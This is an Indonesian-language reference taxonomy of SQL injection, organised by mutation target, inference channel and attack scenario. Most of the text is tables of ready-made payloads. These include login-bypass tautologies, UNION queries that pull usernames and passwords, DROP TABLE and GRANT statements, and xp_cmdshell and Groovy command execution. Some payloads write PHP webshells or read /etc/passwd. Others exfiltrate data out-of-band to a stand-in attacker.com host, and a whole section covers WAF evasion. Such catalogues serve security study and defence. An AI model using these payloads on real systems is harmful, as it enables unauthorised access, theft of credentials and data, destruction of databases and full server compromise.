---
title: SQL Injection
description: Vektor mutasi injeksi SQL dan taksonomi bypass filter
---

## Struktur Klasifikasi

Dokumen ini mengklasifikasikan seluruh attack surface SQL Injection berdasarkan **tiga sumbu ortogonal**. Setiap teknik dapat dilokasikan secara tepat sebagai kombinasi dari ketiga sumbu berikut.

### Sumbu 1: Target Mutasi — APA yang dimutasi
**Komponen struktural** mana dari pesan/request SQL yang dimodifikasi untuk mencapai injection. Ini adalah **sumbu utama** dokumen ini, diorganisir ke dalam 8 kategori utama (§1–§8).

### Sumbu 2: Saluran Inferensi — BAGAIMANA hasilnya diperoleh
Melalui jalur mana penyerang mengamati hasil query yang diinjeksikan. Ini adalah **sumbu lintas kategori**.

| Tipe Saluran | Mekanisme | Kondisi Representatif |
|-------------|-----------|----------------------|
| **In-Band (Output Langsung)** | Hasil query langsung tercermin dalam HTTP response | UNION SELECT, Error-based |
| **Boolean Blind** | Ekstraksi 1-bit melalui perbedaan response (konten, status code) untuk true/false | `AND 1=1` vs `AND 1=2` |
| **Time-Based Blind** | Penentuan true/false melalui fungsi delay kondisional | `IF(cond, SLEEP(5), 0)` |
| **Error-Based** | Data tertanam di dalam pesan error yang dipaksakan | `EXTRACTVALUE`, `UPDATEXML` |
| **Out-of-Band (OOB)** | Data dikirim ke server eksternal melalui request DNS/HTTP | `UTL_HTTP`, `xp_dirtree`, `LOAD_FILE` |
| **Stored/Second-Order** | Titik injection dan titik eksekusi terpisah secara temporal | Disimpan lalu digunakan dalam query lain |

### Sumbu 3: Skenario Serangan — DI MANA digunakan sebagai senjata

| Skenario | Kondisi | Dampak |
|----------|---------|--------|
| **Authentication Bypass** | Query login ditargetkan | Akses admin |
| **Data Exfiltration** | Konteks SELECT | Pencurian data rahasia |
| **Data Manipulation** | Konteks INSERT/UPDATE | Pemalsuan/penyisipan record |
| **Remote Code Execution ([[RCE]])** | File write / eksekusi perintah OS tersedia | Kompromi sistem penuh |
| **Denial of Service ([[DoS]])** | Query yang menghabiskan resource | Penghancuran ketersediaan layanan |
| **[[Privilege Escalation]]** | Modifikasi izin user DB | Perolehan hak admin |
| **[[WAF]]/Filter Bypass** | Perangkat keamanan terpasang | Pengelakan deteksi yang memungkinkan serangan sekunder |

---

## §1. Manipulasi Sintaks Query

Kategori mutasi yang paling fundamental dan luas — memodifikasi langsung elemen sintaks SQL seperti clause, operator, dan keyword untuk mengubah semantik query.

### §1-1. WHERE Clause Tautology

Menginjeksikan kondisi yang selalu benar untuk menetralisir logika filtering query.

| Subtipe | Mekanisme | Contoh [[Payload]] |
|---------|-----------|----------------|
| **Basic Tautology** | Kondisi selalu benar melalui operator `OR` | `' OR 1=1--` |
| **String Tautology** | Kondisi benar melalui perbandingan string | `' OR 'a'='a'--` |
| **Double Negation** | Operator NOT bertingkat untuk menghindari filter | `' OR NOT 0--` |
| **Arithmetic Tautology** | Kondisi benar melalui hasil operasi matematika | `' OR 2>1--` |
| **NULL Exploitation** | Menyalahgunakan semantik perbandingan NULL | `' OR NULL IS NULL--` |
| **Bitwise Operation** | Operator bitwise untuk menghindari pola deteksi | `' OR 1&1--` |

### §1-2. UNION-Based Injection

Menggunakan `UNION SELECT` untuk menambahkan data yang dikontrol penyerang ke result set query asli.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Basic UNION** | Mencocokkan jumlah kolom untuk penggabungan hasil | `' UNION SELECT username,password FROM users--` |
| **NULL Padding** | Menggunakan NULL untuk mencocokkan jumlah kolom | `' UNION SELECT NULL,NULL,NULL--` |
| **ORDER BY Enumeration** | Menyelidiki jumlah kolom melalui percobaan pengurutan | `' ORDER BY 5--` (error jika kolom < 5) |
| **Type-Compatible UNION** | Melewati ketidakcocokan tipe data | `' UNION SELECT 1,'a',3--` |
| **Embedded Subquery** | Subquery di dalam UNION | `' UNION SELECT (SELECT password FROM users LIMIT 1),2--` |
| **GROUP_CONCAT Aggregation** | Menggabungkan beberapa baris menjadi satu | `' UNION SELECT GROUP_CONCAT(username,':',password),2 FROM users--` |

### §1-3. Stacked Queries (Multi-Statement Injection)

Mengakhiri query asli dengan titik koma (`;`) dan mengeksekusi statement yang sepenuhnya baru. Teknik berisiko tinggi yang langsung mengarah ke manipulasi data dan RCE.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Penyisipan Data** | Menambahkan statement INSERT | `'; INSERT INTO users VALUES('hacker','pwd')--` |
| **Penghapusan Data** | Menambahkan statement DELETE/DROP | `'; DROP TABLE users--` |
| **Modifikasi Hak Akses** | Menambahkan statement GRANT/ALTER | `'; GRANT ALL ON *.* TO 'attacker'@'%'--` |
| **Eksekusi Perintah OS (MSSQL)** | Mengaktifkan dan mengeksekusi `xp_cmdshell` | `'; EXEC xp_cmdshell 'whoami'--` |
| **File Write (MySQL)** | Membuat [[webshell]] melalui `INTO OUTFILE` | `'; SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/shell.php'--` |

> **Batasan [[DBMS]]**: Engine dan wire protocol MySQL mendukung stacked queries, namun client library membatasinya secara default. `mysqli_query()` PHP hanya mengizinkan satu query; stacked queries dapat diaktifkan melalui `mysqli_multi_query()` atau pengaturan `PDO::ATTR_EMULATE_PREPARES` PDO. Aktivasi pada level protocol juga memungkinkan melalui flag `CLIENT_MULTI_STATEMENTS`. PostgreSQL dan MSSQL mendukung stacked queries secara default. Oracle tidak mendukungnya.

### §1-4. Subquery & Conditional Expressions

Memanfaatkan subquery dan percabangan kondisional untuk mengekstrak data atau mengontrol alur eksekusi.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Scalar Subquery** | Injeksi subquery dalam konteks SELECT | `' AND (SELECT COUNT(*) FROM users)>0--` |
| **EXISTS Condition** | Penentuan true/false melalui keberadaan data | `' AND EXISTS(SELECT * FROM users WHERE username='admin')--` |
| **CASE/IF Branching** | Ekstraksi bit per bit melalui percabangan kondisional | `' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--` |
| **Nested Subquery** | Rantai subquery multi-level | `' AND (SELECT SUBSTRING(password,1,1) FROM (SELECT password FROM users LIMIT 1) AS t)='a'--` |

---

## §2. Encoding & Obfuscation

Mengubah **bentuk representasi** payload untuk melewati validasi input, WAF, dan filter. Semantik SQL tetap identik, namun representasi di level byte berbeda.

### §2-1. Transformasi Encoding Karakter

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Hexadecimal Encoding** | Menggantikan string dengan hex berawalan 0x | `SELECT * FROM users WHERE name=0x61646D696E` (= 'admin') |
| **URL Encoding** | Karakter khusus dalam bentuk `%XX` | `%27%20OR%201%3D1--` (= `' OR 1=1--`) |
| **Double URL Encoding** | Menerapkan URL encoding dua kali | `%2527` (→ `%27` → `'`) |
| **Unicode Encoding** | Urutan `%uXXXX` atau multibyte UTF-8 | `%u0027%u004F%u0052` (= `'OR`) |
| **HTML Entities** | Konversi ke bentuk `&#xx;` | `&#39; OR 1=1--` |
| **Base64 Encoding** | Membungkus payload dalam Base64 | Ketika aplikasi mendekode Base64 sebelum penyisipan ke query |
| **Invalid UTF-8 Sequences** | Byte UTF-8 yang tidak valid membingungkan fungsi escape | CVE-2025-1094: eksploitasi celah validasi UTF-8 PostgreSQL |
| **CHAR() Function** | Mengubah kode ASCII menjadi karakter | `CHAR(97,100,109,105,110)` (= 'admin') |

### §2-2. Substitusi Whitespace

Menggunakan berbagai karakter yang diakui sebagai whitespace dalam SQL untuk melewati filter berbasis spasi.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Inline Comment** | Menggantikan spasi dengan `/**/` | `'/**/OR/**/1=1--` |
| **Karakter Tab** | `%09` (tab) sebagai pengganti spasi | `'%09OR%091=1--` |
| **Karakter Newline** | `%0A` (LF), `%0D` (CR) sebagai pengganti | `'%0AOR%0A1=1--` |
| **Parentheses** | Pemisahan token melalui tanda kurung | `'OR(1=1)--` |
| **Tanda Plus (MSSQL)** | `+` digunakan sebagai whitespace | `'+OR+1=1--` |
| **Null Byte** | Penyisipan `%00` (Oracle, dll.) | `'%00OR 1=1--` |

> **Karakter Whitespace Spesifik DBMS**: MySQL(`09,0A,0B,0C,0D,A0,20`), PostgreSQL(`0A,0D,0C,09,20`), MSSQL(`01-1F,20`), Oracle(`00,0A,0D,0C,09,20`), SQLite(`0A,0D,0C,09,20`)

### §2-3. Comment-Based Obfuscation

Memanfaatkan sintaks komentar SQL untuk memecah keyword atau mencapai eksekusi kondisional.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Penyisipan Inline Comment** | Menyisipkan `/**/` di dalam keyword | `SEL/**/ECT`, `UN/**/ION` |
| **MySQL Versioned Conditional Comment** | `/*!NNNNN ... */` hanya dieksekusi pada versi tertentu ke atas | `/*!50000SELECT*/ * FROM users` |
| **Nested Comment** | Komentar di dalam komentar untuk membingungkan parser | `/*! /*!*/ SELECT */ 1` |
| **Penghapusan Sisa Query** | Meniadakan sisa query dengan `--`, `#`, `/*` | `admin'--` |
| **MySQL Hash Comment** | Komentar `#` khusus MySQL | `' OR 1=1 #` |

### §2-4. Mutasi Case & Keyword

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Mixed Case** | Mengeksploitasi ketidakpekaan huruf besar/kecil pada keyword SQL | `sElEcT`, `UnIoN`, `SeLeCt` |
| **Keyword Doubling** | Saat filter menghapus keyword hanya sekali | `SELSELECTECT` (filter menghapus SELECT → SELECT tersisa) |
| **Synonym Substitution** | Menggunakan keyword berbeda dengan fungsi sama | `LIKE` sebagai ganti `=`; `RLIKE`/`REGEXP` sebagai ganti `LIKE`; `||` sebagai ganti `OR` |
| **Function Name Substitution** | Menggunakan fungsi berbeda dengan perilaku sama | `MID()` = `SUBSTR()` = `SUBSTRING()` |
| **Scientific Notation** | Angka dalam notasi ilmiah | `0e0` = 0, `1e0UNION` |
| **String Concatenation** | Membangun keyword melalui penggabungan string | `'sel'+'ect'` (MSSQL), `'sel'||'ect'` (Oracle) |

---

## §3. Eksploitasi Fitur Khusus DBMS

Mutasi yang memanfaatkan **fungsi, sintaks, dan objek sistem eksklusif** yang unik pada setiap engine database. Bahkan dengan niat serangan yang identik, payload berbeda secara fundamental antar DBMS.

### §3-1. Teknik Khusus MySQL

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Versioned Conditional Execution** | Kode spesifik versi melalui komentar `/*!NNNNN*/` | `/*!50000UNION*//*!50000SELECT*/1,2,3` |
| **LOAD_FILE / INTO OUTFILE** | Baca/tulis file | `' UNION SELECT LOAD_FILE('/etc/passwd'),2--` |
| **BENCHMARK Time Delay** | Inferensi berbasis waktu melalui BENCHMARK() | `' AND BENCHMARK(10000000,SHA1('a'))--` |
| **Enumerasi information_schema** | Query tabel metadata | `' UNION SELECT table_name,2 FROM information_schema.tables--` |
| **GROUP BY / HAVING Error Leak** | Pengungkapan nama kolom melalui error agregasi | `' GROUP BY columnname HAVING 1=1--` |
| **PROCEDURE ANALYSE** | Kebocoran informasi tipe data | `' PROCEDURE ANALYSE()--` |
| **Eksploitasi @Variable** | Ekstraksi multi-langkah melalui variabel pengguna | `' AND(@a:=CONCAT_WS(':',table_name) FROM information_schema.tables)--` |
| **Full-Text Search Blind Oracle** | Menyalahgunakan `MATCH ... AGAINST` dalam mode boolean: parser boolean full-text MySQL menginterpretasikan operator (`+`, `-`, `*`, `~`) yang berinteraksi dengan redirect atau perilaku error di level aplikasi, menciptakan oracle inferensi blind dari endpoint yang tidak mengembalikan hasil query secara langsung | `' AND MATCH(col) AGAINST('+target*' IN BOOLEAN MODE)--` |

### §3-2. Teknik Khusus PostgreSQL

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **COPY TO/FROM** | Akses filesystem | `'; COPY (SELECT '') TO PROGRAM 'id'--` |
| **pg_sleep Time Delay** | Inferensi blind berbasis waktu | `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--` |
| **Large Object Functions** | Akses file melalui lo_import/lo_export | `'; SELECT lo_import('/etc/passwd')--` |
| **Dollar-Quoted Strings** | Bypass filter kutip melalui sintaks `$$...$$` | `$$text$$` sebagai ganti `'text'` |
| **Type Casting (::)** | Induksi error/bypass melalui operator casting | `' AND 1::int=1--`, `CAST(expr AS type)` |
| **Enumerasi pg_catalog** | Query tabel katalog sistem | `' UNION SELECT usename,passwd FROM pg_shadow--` |
| **CHR() Function Chaining** | Konstruksi string melalui penggabungan CHR() | `CHR(65)||CHR(66)||CHR(67)` (= 'ABC') |
| **Celah Encoding UTF-8** | Bypass fungsi escape melalui UTF-8 tidak valid (CVE-2025-1094) | Urutan UTF-8 tidak valid menyebabkan pemisahan statement psql |
| **Filenode Offline Manipulation** | Dengan akses SELECT saja, baca `pg_relation_filenode()` untuk memetakan OID tabel ke path file fisik, lalu manipulasi raw heap page melalui `lo_import`/`lo_export` untuk menulis ulang atribut role (misalnya flag `rolsuper` di `pg_authid`), eskalasi ke superuser dan RCE (Phrack) | `SELECT pg_relation_filenode('pg_authid');` → edit page offline → eskalasi role |

### §3-3. Teknik Khusus Microsoft SQL Server

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **xp_cmdshell** | Eksekusi perintah OS | `'; EXEC xp_cmdshell 'whoami'--` |
| **xp_dirtree / xp_fileexist** | Eksfiltrasi data [[OOB]] (DNS/UNC) | `'; EXEC xp_dirtree '\\attacker.com\share'--` |
| **OPENROWSET / OPENDATASOURCE** | Koneksi server remote / eksfiltrasi data | `'; SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'pwd','SELECT 1')--` |
| **WAITFOR DELAY** | Inferensi blind berbasis waktu | `'; WAITFOR DELAY '0:0:5'--` |
| **sp_OACreate** | RCE melalui pembuatan [[COM object ]]| Memerlukan OLE Automation Procedures diaktifkan |
| **Error-Based Conversion** | Kebocoran data melalui error konversi tipe | `' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--` |
| **Differential Backup Webshell** | Penulisan file melalui fungsionalitas backup | Menyimpan backup diferensial ke path yang dapat diakses web untuk membuat webshell |

### §3-4. Teknik Khusus Oracle

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **UTL_HTTP / UTL_INADDR** | Eksfiltrasi data OOB (HTTP/DNS) | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
| **DBMS_PIPE** | Inferensi blind berbasis waktu | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` |
| **CTXSYS.DRITHSX.SN** | Eksfiltrasi data berbasis error | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--` |
| **XMLTYPE / EXTRACTVALUE** | Kebocoran data melalui error fungsi XML | `' AND EXTRACTVALUE(XMLTYPE('<?xml ...>'),'/x')--` |
| **Double Pipe Concatenation (||)** | Operator penggabungan string | `'||'` (= penggabungan string kosong) |
| **FROM DUAL Wajib** | Oracle mewajibkan clause FROM dalam SELECT | `' UNION SELECT NULL FROM DUAL--` |
| **Pembatasan Berbasis ROWNUM** | Mekanisme pembatasan baris Oracle | `' AND ROWNUM=1--` |

### §3-5. Teknik Khusus SQLite

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Enumerasi sqlite_master** | Query metadata skema | `' UNION SELECT sql FROM sqlite_master--` |
| **RANDOMBLOB Time Delay** | Delay melalui pembuatan data acak berukuran besar | `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--` |
| **ATTACH DATABASE** | Penulisan file melalui pembuatan file DB baru | `'; ATTACH DATABASE '/var/www/shell.php' AS lol; CREATE TABLE lol.x(y text); INSERT INTO lol.x VALUES('<?php...');--` |
| **typeof() / unicode()** | Ekstraksi informasi tipe/karakter | `' AND unicode(substr(password,1,1))>64--` |

### §3-6. Teknik Khusus Database Cloud

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **BigQuery Dialect Injection** | Google BigQuery menggunakan sintaks SQL non-standar (identifier dikutip dengan backtick, `SAFE_DIVIDE()`, `FORMAT()`, `UNNEST()`) yang ruleset WAF standar yang disesuaikan untuk MySQL/PostgreSQL/MSSQL gagal mendeteksinya | `` SELECT * FROM `project.dataset.table` WHERE SAFE_DIVIDE(1,(SELECT IF(condition,1,0)))=1 `` |

### §3-7. Teknik Khusus Database Analitik Real-Time (Apache Pinot)

Apache Pinot adalah datastore OLAP terdistribusi real-time yang menggunakan SQL berbasis Apache Calcite (banyak fitur Calcite tidak didukung). Attack surface injection uniknya berasal dari eksekusi skrip Groovy bawaan yang diaktifkan secara default di semua versi rilis hingga 0.10.0.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Pengelakan filter OPTION()** | Pinot memproses `OPTION(key=value)` yang tertanam di mana saja dalam query, termasuk di dalam string literal, tanpa peringatan. Query untuk `thingumajig` dan `thinguOPTION(a=b)majig` mengembalikan hasil yang identik — melewati validasi input dan WAF | `WHERE col LIKE '%oPtIoN(a=b)%'` |
| **GROOVY() RCE** | `GROOVY('{"returnType":"INT","isSingleValue":true}', 'code', col)` mengeksekusi kode Groovy (JVM) arbitrer di komponen Server sebagai root. Metode Java termasuk `Runtime.exec()` tersedia | `GROOVY('{"returnType":"INT","isSingleValue":true}', '"whoami".execute().text; return 1', studentID)` |
| **Pergerakan lateral IN_SUBQUERY** | `IN_SUBQUERY(col, 'SELECT ID_SET(col) FROM otherTable WHERE GROOVY(...)=3')` mengeksekusi subquery pada tabel/Server yang berbeda, memungkinkan pergerakan lateral lintas server di dalam cluster Pinot tanpa memodifikasi titik injection utama | `WHERE IN_SUBQUERY('x', 'SELECT ID_SET(firstName) FROM tableB WHERE groovy(...) = 3') = true` |
| **REGEXP_LIKE [[ReDoS]]** | Regex Java melalui `REGEXP_LIKE` memungkinkan ReDoS dengan pola backtracking katastrofik | `REGEXP_LIKE(col, '((((((.*)*)*)*)*)*)*zz')` |
| **Ekstraksi blind melalui CASE + SUBSTR** | `SUBSTR(col, start, end)` (0-indexed), `LENGTH()`, ekspresi `CASE`, dan `toUtf8()` untuk fungsi hash memungkinkan eksfiltrasi data melalui response kondisional | `CASE WHEN SUBSTR(secret,0,1)='a' THEN col ELSE col-1 END` |

**Pasca eksploitasi:** Shell root pada Server memungkinkan manipulasi Zookeeper, query GRPC tanpa autentikasi ke Server lain, penyalahgunaan Controller API, dan ekstraksi kredensial cloud dari variabel lingkungan (Doyensec, 2022).

---

## §4. Input Vector & Jalur Pengiriman

DI MANA payload SQL disisipkan dan BAGAIMANA mencapai aplikasi. Di luar parameter GET/POST tradisional, berbagai komponen HTTP dan format data berfungsi sebagai jalur injection.

### §4-1. Manipulasi Parameter HTTP

| Subtipe | Mekanisme | Titik Injection |
|---------|-----------|----------------|
| **Parameter GET** | Penyisipan dalam query string URL | `?id=1' OR 1=1--` |
| **Body POST** | Penyisipan dalam data form | `username=admin'--&password=x` |
| **Parameter Numerik** | Injection langsung tanpa kutipan | `?id=1 OR 1=1` |
| **[[HTTP Parameter Pollution]] (HPP)** | Beberapa parameter identik membingungkan WAF | `?id=1&id=' OR 1=1--` (server menggunakan nilai kedua) |

### §4-2. Header-Based Injection

Terjadi ketika aplikasi mempercayai nilai header HTTP dan menyisipkannya ke dalam query.

| Subtipe | Mekanisme | Titik Injection |
|---------|-----------|----------------|
| **Cookie Injection** | Nilai cookie identifikasi sesi/pengguna | `Cookie: session=admin' OR 1=1--` |
| **User-Agent Injection** | Logging/analisis string UA | `User-Agent: ' OR 1=1--` |
| **Referer Injection** | Logging Referer | `Referer: ' OR 1=1--` |
| **X-Forwarded-For Injection** | Logging IP/kontrol akses | `X-Forwarded-For: ' OR 1=1--` |
| **Authorization Header** | Pemrosesan token autentikasi | Injection dalam nilai header auth kustom |

### §4-3. Injection Format Data Terstruktur

SQL injection dalam format body JSON, XML, dan format terstruktur lainnya. Khususnya, injection berbasis JSON melewati semua WAF komersial utama (§7-2).

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **JSON Parameter Injection** | Penyisipan SQL dalam nilai JSON | `{"username":"admin' OR 1=1--","password":"x"}` |
| **JSON SQL Syntax Abuse** | Bypass WAF melalui operator JSON | `1 OR JSON_EXTRACT('{"a":1}','$.a')=1` (lihat §7-2) |
| **XML Encoding Injection** | Encoding payload melalui entitas XML | `<stockCheck><productId>&#x31;&#x27;&#x20;UNION SELECT...` |
| **Parameter SOAP** | Injection dalam nilai pesan SOAP | Penyisipan SQL dalam parameter SOAP berbasis XML |
| **GraphQL Variable Injection** | Penyisipan SQL dalam variabel query GraphQL | `{"query":"{ user(id:\"1' OR 1=1--\") { name } }"}` |

### §4-4. Jalur Injection Non-Tradisional

| Subtipe | Mekanisme | Kondisi |
|---------|-----------|---------|
| **Nama File Upload** | Nama file upload disimpan di DB | `filename="' OR 1=1--.jpg"` |
| **DNS/Hostname** | Host header digunakan dalam query | `Host: ' OR 1=1--` |
| **Field Email** | Pemrosesan alamat email | `test'OR1=1--@example.com` |
| **Fungsionalitas Pencarian** | Query pencarian teks penuh | SQL injection dalam kata kunci pencarian |

---

## §5. Teknik Inferensi Blind

Teknik mengekstrak data melalui **sinyal tidak langsung** di lingkungan di mana hasil query tidak langsung ditampilkan. Skenario paling umum ditemui di aplikasi modern.

### §5-1. Inferensi Berbasis Boolean

Mengekstrak data 1 bit sekaligus dengan mengamati perbedaan true/false dalam response (konten halaman, HTTP status code, perilaku redirect).

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Perbedaan Konten** | Konten halaman bervariasi untuk true/false | `' AND SUBSTRING(username,1,1)='a'--` |
| **Perbedaan Status Code** | Percabangan kode response (200 vs 302, dll.) | `' AND 1=(SELECT 1 FROM users WHERE username='admin')--` |
| **Induksi Error Kondisional** | Error hanya dipicu saat kondisi benar | `' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--` |
| **Pola REGEXP/LIKE** | Pengujian rentang karakter melalui regex | `' AND password REGEXP '^a'--` |
| **Bitwise Extraction** | Ekstraksi efisien melalui operasi bit | `' AND ORD(MID(password,1,1))&128=128--` |
| **Binary Search** | Mempersempit rentang kode karakter secara berulang | `' AND ASCII(SUBSTR(pwd,1,1))>64--` (pembagian biner berulang) |

### §5-2. Inferensi Berbasis Waktu

Menentukan true/false dengan sengaja memicu delay saat kondisi benar, mengamati waktu response.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **SLEEP / pg_sleep / WAITFOR** | Fungsi delay bawaan DBMS | MySQL: `' AND IF(1=1,SLEEP(5),0)--` |
| **Heavy Query (Computation Bomb)** | Delay melalui operasi yang intensif CPU | `' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0--` |
| **BENCHMARK (MySQL)** | Delay melalui operasi berulang | `' AND BENCHMARK(50000000,SHA1('x'))--` |
| **Conditional Delay + Binary Search** | Menggabungkan time delay dengan binary search | `' AND IF(ASCII(SUBSTR(pwd,1,1))>64,SLEEP(3),0)--` |
| **RANDOMBLOB (SQLite)** | Delay melalui pembuatan data acak berukuran besar | Lihat §3-5 |

### §5-3. Ekstraksi Berbasis Error

Sengaja memicu error SQL sambil memastikan data yang diinginkan tertanam dalam pesan error.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **EXTRACTVALUE (MySQL)** | Data tertanam dalam error XPath | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--` |
| **UPDATEXML (MySQL)** | Eksploitasi error pembaruan XML | `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--` |
| **CONVERT/CAST (MSSQL)** | Data tertanam dalam error konversi tipe | `' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--` |
| **XMLTYPE (Oracle)** | Eksploitasi error parsing XML | Lihat §3-4 |
| **EXP() Overflow (MySQL)** | Overflow fungsi matematika | `' AND EXP(~(SELECT*FROM(SELECT user())x))--` |
| **Double Query Error** | Error kunci duplikat / subquery | `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--` |
| **GeometryCollection (MySQL)** | Eksploitasi error fungsi spasial | `' AND GeometryCollection((SELECT*FROM(SELECT*FROM(SELECT user())a)b))--` |

### §5-4. Saluran Out-of-Band (OOB)

Mengirimkan data ke server eksternal melalui DNS lookup, request HTTP, atau **saluran jaringan terpisah** lainnya. Metode ekstraksi paling efisien di lingkungan blind.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Eksfiltrasi DNS (MSSQL)** | DNS lookup melalui [[UNC path]] | `'; EXEC xp_dirtree '\\'+user()+'.attacker.com\a'--` |
| **Eksfiltrasi DNS (Oracle)** | DNS lookup melalui UTL_INADDR | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--` |
| **Eksfiltrasi HTTP (Oracle)** | Request HTTP eksternal melalui UTL_HTTP | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
| **Eksfiltrasi HTTP (MSSQL)** | Koneksi eksternal melalui OPENROWSET | `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'a';'a','SELECT 1')--` |
| **Eksfiltrasi DNS (MySQL)** | DNS melalui LOAD_FILE | `' AND LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--` |
| **Eksfiltrasi DNS (PostgreSQL)** | Memanfaatkan dblink / COPY TO PROGRAM | `'; CREATE EXTENSION dblink; SELECT dblink_connect('host='||(SELECT user)||'.attacker.com')--` |

---

## §6. Mutasi Temporal & Kontekstual

Mutasi berdasarkan **waktu injection** dan **konteks eksekusi**. Mencakup kasus di mana payload tidak langsung dieksekusi, atau beroperasi dalam konteks SQL selain query asli (INSERT, UPDATE, ORDER BY, dll.).

### §6-1. Second-Order Injection

Payload tidak berbahaya saat waktu penyimpanan tetapi **dieksekusi saat direferensikan kemudian oleh query yang berbeda**. Rentan bahkan ketika Prepared Statement digunakan, jika data yang tersimpan dipercaya.

| Subtipe | Mekanisme | Skenario |
|---------|-----------|----------|
| **Berbasis Username** | Payload disimpan saat pendaftaran → dieksekusi pada query profil | Daftar sebagai `admin'--` → perubahan password memodifikasi akun admin |
| **Berbasis Post/Komentar** | Post disimpan → dieksekusi pada query dashboard admin | SQL dalam judul post → dieksekusi dalam query statistik |
| **Berbasis Log** | Nilai berbahaya dicatat → dieksekusi pada pencarian/analisis log | Nilai berbahaya disimpan di tabel log → direferensikan di dashboard |
| **Berbasis Konfigurasi** | Pengaturan diubah → direferensikan oleh fungsi sistem | Nilai konfigurasi tersimpan di DB digunakan dalam query dinamis |

### §6-2. Injection Spesifik Konteks

Ketika titik injection berada di clause SQL selain WHERE pada SELECT, teknik khusus diperlukan untuk setiap konteks.

| Subtipe | Konteks | Contoh Payload |
|---------|---------|----------------|
| **INSERT Injection** | Penyisipan clause VALUES | `'); INSERT INTO admins VALUES('hacker','pwd')--` |
| **UPDATE SET Injection** | Penyisipan nilai clause SET | `', password='hacked' WHERE username='admin'--` |
| **ORDER BY Injection** | Penyisipan kriteria pengurutan (tidak dapat diparameterisasi) | `1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)` |
| **GROUP BY Injection** | Penyisipan kriteria pengelompokan | `1 HAVING 1=1--` |
| **LIMIT/OFFSET Injection** | Penyisipan parameter paginasi | `10 PROCEDURE ANALYSE(EXTRACTVALUE(0,CONCAT(...)))` |
| **Injection Nama Tabel/Kolom** | Penyisipan identifier dinamis | `` `admin`; DROP TABLE users--`` (tidak dapat dipertahankan melalui prepared statement) |
| **LIKE Pattern Injection** | Penyisipan wildcard dalam pola pencarian | `%` (mengembalikan semua hasil), `_` (wildcard satu karakter) |

### §6-3. Rantai Serangan Multi-Tahap

Mencapai tujuan yang **tidak dapat dicapai melalui injection tunggal** melalui injeksi sekuensial berantai.

| Subtipe | Mekanisme | Tahapan |
|---------|-----------|---------|
| **Recon → Privesc → RCE** | Eskalasi tujuan bertahap | ①Cek versi DB → ②Cek hak akses user → ③Aktifkan xp_cmdshell → ④Eksekusi perintah |
| **SQLi → File Write → Webshell** | Pivot ke akses filesystem | ①Buat shell PHP via INTO OUTFILE → ②Akses shell via HTTP |
| **Data Exfil → Auth Bypass** | Memanfaatkan info yang diekstrak untuk akses sah | ①Ekstrak hash admin → ②Crack hash → ③Login normal |

---

## §7. Mutasi Pengelakan WAF/Filter

Transformasi payload yang **dikhususkan** untuk melewati perangkat keamanan (WAF, [[IDS]], filter input). Meskipun tumpang tindih dengan §2 (Encoding), bagian ini berfokus pada teknik yang menyerang logika deteksi WAF itu sendiri.

### §7-1. Pengelakan Signature

Transformasi payload yang mengelak aturan pencocokan regex/pola WAF.

| Subtipe | Mekanisme | Contoh Payload |
|---------|-----------|----------------|
| **Substitusi Tanda Sama Dengan (=)** | Operator ekuivalensi sebagai ganti `=` | `LIKE`, `RLIKE`, `REGEXP`, `BETWEEN...AND`, `IN()`, `<>` (NOT EQUAL yang dinegasi) |
| **Substitusi AND/OR** | Operator logika sebagai simbol | `&&` (AND), `||` (OR) |
| **Payload Tanpa Spasi** | Semua whitespace dihapus | `'OR(1=1)#`, `'OR(1)=(1)#` |
| **Ekstraksi Tanpa SELECT** | Ekstraksi data tanpa keyword SELECT | `TABLE users` (MySQL 8.0+), `VALUES ROW(1)` |
| **Payload Tanpa Koma** | Substitusi koma dalam UNION | `' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--` |
